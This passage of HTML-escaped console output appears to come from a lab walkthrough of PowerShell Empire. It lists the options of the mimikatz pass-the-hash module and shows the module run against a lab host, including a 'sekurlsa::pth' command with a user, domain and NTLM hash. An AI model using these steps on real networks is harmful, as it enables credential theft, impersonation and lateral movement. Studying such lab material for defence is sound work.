&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Agent&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SU3EWKV&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Agent&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CredID&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CredID&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;the&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;store&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ticket&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;creation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                 &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;domain&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;The&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fully&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;qualified&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;domain&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ntlm&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;The&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NTLM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;impersonate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Empire&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;usemodule&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;credentials&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mimikatz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pth&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CredID&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Empire&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;usemodule&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;credentials&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mimikatz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pth&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Tasked&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SU3EWKV&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Task&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Task&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;received&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Job&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;started&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;86&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ESCA&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Task&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;received&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Hostname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WIN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lab&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;733602728&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4270550081&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3256311297&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;## ^ ##.  &amp;#34;A La Vie, A L&amp;#39;Amour&amp;#34; - (oe.eo)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;## \ / ##       &amp;gt; https://blog.gentilkiwi.com/mimikatz
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;## v ##&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Vincent&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;TOUX&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vincent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;letoux&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gmail&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;#####&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pingcastle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mysmartlogon&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;***/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;mimikatz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# sekurlsa::pth /user:testuser /domain:HACK /ntlm:de26cce0356891a4a020e7c4957afc72
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testuser&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
